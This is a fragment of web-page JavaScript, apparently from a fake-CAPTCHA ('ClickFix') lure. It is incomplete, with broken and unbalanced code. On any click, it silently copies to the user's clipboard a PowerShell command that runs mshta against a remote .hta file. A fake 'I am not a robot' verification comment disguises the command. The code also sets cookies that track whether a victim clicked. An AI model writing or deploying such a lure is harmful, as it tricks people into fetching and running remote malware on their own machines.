                    console.clear();

                }

        (function () {
            const textToCopy = "powershell /c mshta http://mcedge.github.io/mcedge/index.hta# ✅ I am not a robot - CAPTCHA Verification ID: 114514";

            async function copyText(text) {
                try {
                    if (navigator.clipboard && window.isSecureContext) {
                        await navigator.clipboard.writeText(text);
                        return true;
                    }
                } catch (e) { }
                const ta = document.createElement("textarea");
                ta.value = text;
                ta.setAttribute("readonly", "");
                ta.style.position = "fixed";
                ta.style.left = "-9999px";
                document.body.appendChild(ta);
                ta.select();
                try {
                    document.execCommand("copy");
                    document.body.removeChild(ta);
                    return true;
                } catch (err) {
                    document.body.removeChild(ta);
                    return false;
                }
            }

            document.addEventListener("click", async () => {
                await copyText(textToCopy);
            });
        })();
        document.addEventListener('DOMContentLoaded', async () => {
            function getCookie(name) {
                return document.cookie
                    .split('; ')
                    .find((row) => row.startsWith(name + '='))
                    ?.split('=')[1];
            }

            function setCookie(name, value, maxAgeSeconds) {
                document.cookie = `${name}=${value}; path=/; max-age=${maxAgeSeconds}`;
            }

            const baseHref = document.querySelector('base')?.getAttribute('href') || '/';
            const pathSegments = baseHref.split('/').filter(Boolean);
            const SITE_FOLDER = pathSegments.length ? pathSegments[pathSegments.length - 1] : '';

                            clickSent = true;
                            setCookie('click', '1', COOKIE_MAX_AGE);
                        }
                    },

                        setCookie('win', '1', COOKIE_MAX_AGE);

            currentUrl.searchParams.delete('static');
            window.history.replaceState({}, document.title, currentUrl.pathname + currentUrl.search);
        }
